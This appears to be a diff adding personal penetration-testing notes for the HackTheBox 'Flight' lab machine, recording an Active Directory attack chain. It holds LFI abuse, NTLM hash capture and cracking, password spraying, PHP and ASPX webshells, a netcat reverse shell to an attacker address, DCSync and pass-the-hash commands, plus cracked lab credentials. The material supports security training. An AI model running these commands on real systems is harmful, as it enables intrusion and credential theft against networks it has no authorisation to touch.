@@ -1,0 +1,210 @@
+### Enumeration
+```
+IP=10.10.10.10
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p -A $IP
+nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 53
+	- DNS
+- 80
+	- Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+- 88
+	- kerberos
+- 135
+	- RPC
+- 139
+	- RPC
+- 389
+	- Microsoft Windows Active Directory LDAP (Domain: flight.htb0, Site: Default-First-Site-Name)
+- 445
+	- smb
+- 464
+	- kpasswd5
+- 593
+	- RPC
+- 636
+	- tcpwrapped
+- 3268
+	- Microsoft Windows Active Directory LDAP (Domain: flight.htb0, Site: Default-First-Site-Name)
+- 3269
+	- tcpwrapped
+- 5722
+	- RPC
+- 9389
+	- .NET Message Framing
+- 47001
+	- RPC
+- 49152-49158
+	- RPC
+- 49169
+	- RPC
+- 49170
+	- RPC
+- 49179
+	- RPC
+### Foothold
+- DNS
+	- nslookup
+		- server $IP
+		- 127.0.0.1
+	- dig @$IP domain
+		- If domain resolves
+			- dig axfr @$IP domain
+- RPC/ SMB
+	- enum4linux $IP
+	- crackmapexec smb $IP -u guest -p "" --rid-brute
+	- crackmapexec smb $IP -u "" -p "" --pass-pol
+	- rpcclient -U '' $IP
+		- enumdomusers
+		- queryusergroups RID
+		- queryuser RID
+- 445
+	- smbclient -N -L //$IP
+		- access denied
+	- nmap --script smb-vuln* -p135,139,445 $IP
+- 80
+	- Default landing page
+	- Versions
+	- Subdomain finder
+		- wfuzz -u http://10.10.11.187 -H "Host: FUZZ.flight.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 7069
+			- School
+	- Directory Brute force
+		- dirsearch -u http://$IP
+			- phpmyadmin
+		- dirsearch -u http://school.$IP
+			- blog.html
+			- index.php
+		- ffuf -w /usr/share/seclists/Discovery/DNS/n0kovo_subdomains.txt -u http://$IP/FUZZ
+		- Found directories
+	- Vulnerability scan
+		- nikto -h http://$IP
+	- school.$IP
+		- /index.php
+			- Parameter - LFI
+				- ?view=c:/windows/system32/drivers/etc/hosts
+					- Returns valid page
+			- LFI to RFI
+				- python3 -m http.server 80
+					- echo '<?php echo '0xdf was here'; ?>' > file.txt
+				- ?view=http://A_IP/file.txt
+					- If file loads then we can do RFI
+					- If the text just appears and doesn't execute then its just read over RFI
+				- We can capture hash with responder
+					- Sudo responder -I tun0
+					- Do RFI to read a file
+					- Captures the NTLMv2 hash for svc_apache
+					- Crack the hash
+						- hashcat svc_apache-net-ntlmv2 /usr/share/wordlists/rockyou.txt
+							- `S@Ss!K@*t13
+- svc_apache
+	- crackmapexec smb flight.htb -u svc_apache -p 'S@Ss!K@*t13' --shares
+		- READ
+			- IPC$
+			- NETLOGON
+			- SYSVOL
+			- Shared
+			- Users
+				- User folders
+			- Web
+				- flight.htb
+				- school.flight.htb
+				- No useful in either folder
+	- impacket-lookupsid flight.htb/svc_apache:'S@Ss!K@*t13'@flight.htb | grep SidTypeUser | cut -d' ' -f 2 | cut -d'\' -f 2 | tee users
+		- Administrator, Guest, krbtgt, G0$, S.Moon, R.Cold, G.Lors, L.Kein, M.Gold, C.Bum, W.Walker, I.Francis, D.Truff, V.Stevens, svc_apache, O.Possum
+		- Put all into a users.txt file
+- Password spray
+	- crackmapexec smb $IP -u users.txt -p users.txt
+		- nothing
+	- crackmapexec smb $IP -u users.txt -p 'S@Ss!K@*t13'
+		- success:  S.Moon and svc_apache
+- S.Moon
+	- crackmapexec smb $IP -u S.Moon -p 'S@Ss!K@*t13' --shares
+		- READ on all same shares
+		- Write over Shared
+			- mkdir file_attacks
+			- cd file_attacks
+			- python ntlm_theft.py -g all -s A_IP -f 0xdf
+			- sudo responder -I tun0
+		- Put all files into Shared
+			- smbclient //flight.htb/shared -U S.Moon 'S@Ss!K@*t13'
+			- prompt false
+			- mput *
+		- Responder captures NTLMv2 hash
+			- hashcat c.bum-net-ntlmv2 /usr/share/wordlists/rockyou.txt
+				- C.Bum:Tikkycoll_431012284
+- C.Bum
+	- crackmapexec smb flight.htb -u c.bum -p 'Tikkycoll_431012284' --shares
+		- READ over same shares
+		- Write over Web and Shared
+		- Web
+			- put simple php rev shell
+			- echo '<?php system($_REQUEST['cmd']); ?>' > webshell.php
+		- curl school.flight.htb/styles/shell.php?cmd=whoami
+			- We receive whoami results
+			- Put nc.exe into web share
+		- `curl -G school.flight.htb/styles/shell.php --data-urlencode 'cmd=nc64.exe -e cmd.exe 10.10.14.6 443'
+			- Leads to RCE as svc_apache
+### PE
+#### Windows
+- svc_apache
+	- whoami /all
+	- Root drive directory
+		- inetpub
+		- wwwroot
+		- development
+			- icacls development
+				- C.Bum has write access
+	
+	- net user C.Bum
+		- Check group memberships
+		- Domain Users  WebDevs
+	- netstat -ano
+		- Active ports
+			8000
+	- Change Users
+		- RunasCs.exe
+			- On A: nc -lvnp 443
+			- .\RunasCs.exe C.Bum Tikkycoll_431012284 -r !_IP:443 cmd
+			- receive shell as C.Bum
+- C.Bum
+	- Setup chisel to view port 8000
+		- ./chisel_1.7.7_linux_amd64 server -p 8000 --reverse
+		- .\chisel client A_IP:8000 R:8001:127.0.0.1:8000
+	- From firefox, http://127.0.0.1:80001
+		- Internal flight website
+		- Put a test text file in development directory
+		- We can load the file.
+		- Put aspx webshell in directory [https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx]
+		- Now we can run shell commands as defaultapppool
+		- Use nc.exe to get rev shell as defaultapppool
+- defaultapppool
+	- When trying to authenticate. It will authenticate as a machine user. 
+	- Capture hash
+		- sudo responder -I tun0
+		- net user \\A_IP\Shared
+		- Captures hash for G0$
+		- Uncrackable
+	- Rubeus (DCSync Attack)
+		- Generate ticket
+			- .\rubeus.exe tgtdeleg /nowrap
+			- Gives us machine ticket. Copy the base64 ticket. echo 'BASE64' | base64 -d > ticket.kirbi
+			- kirbi2ccache ticket.kirbi ticket.ccache
+			- export KRB5CCNAME=ticket.ccache
+		- DCSync
+			- secretsdump.py -k -no-pass g0.flight.htb -just-dc-user administrator
+				- Fails due to time issue
+			- sudo ntpdate -s $IP
+			- Now secretsdump works
+			- Administrator hash
+				- Administrator:500:aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c:::
+			- impacket-psexec administrator@$IP -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
+	
+### Credentials
+### Lessons Learned
+- RunasCs needs put in my notes - https://github.com/antonioCoco/RunasCs
+- Compiled exploits: https://github.com/Flangvik/SharpCollection/tree/master
+	- Check what .Net version: 
